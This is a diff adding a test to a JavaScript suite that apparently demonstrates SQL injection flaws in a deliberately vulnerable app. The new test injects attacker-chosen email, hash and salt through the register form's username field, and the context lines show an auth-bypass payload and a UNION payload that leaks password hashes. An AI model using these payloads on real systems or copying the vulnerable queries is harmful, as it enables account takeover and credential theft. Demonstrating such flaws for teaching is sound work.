@@ -42,6 +42,24 @@ test('SC9: SQLi auth-bypass SUCCEEDS (the vulnerability being demonstrated)', as
   assert.equal(res.status, 200); // the -- comments out the password_hash check -> logged in
 });
 
+test('§1 SQLi: the register form injects attacker-controlled column values', async () => {
+  const marker = `inj_${runId}@evil.example`;
+  const injectedUser = uname('reginj');
+  const HASH = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef';
+  const SALT = 'cafecafecafecafecafecafecafecafe';
+  // The username breaks out of the VALUES list and sets email/hash/salt itself; `-- ` comments the rest.
+  const payload = `${injectedUser}', '${marker}', '${HASH}', '${SALT}') -- `;
+  const res = await request(app).post('/api/register')
+    .send({ username: payload, email: 'ignored@example.com', password: VALID_PW });
+  assert.equal(res.status, 201);
+
+  const [rows] = await pool.execute(
+    'SELECT email, password_hash FROM users WHERE username = ?', [injectedUser]);
+  assert.equal(rows.length, 1);
+  assert.equal(rows[0].email, marker);                 // injected, not the sent 'ignored@example.com'
+  assert.equal(rows[0].password_hash.trim(), HASH);    // attacker controls the stored hash too
+});
+
 test('SC11: a UNION payload leaks users columns through customer search', async () => {
   const payload = "' UNION SELECT id, username, password_hash, salt, 1, 1, 1, NOW() FROM users -- ";
   const res = await canary.agent.get('/api/customers?search=' + encodeURIComponent(payload));
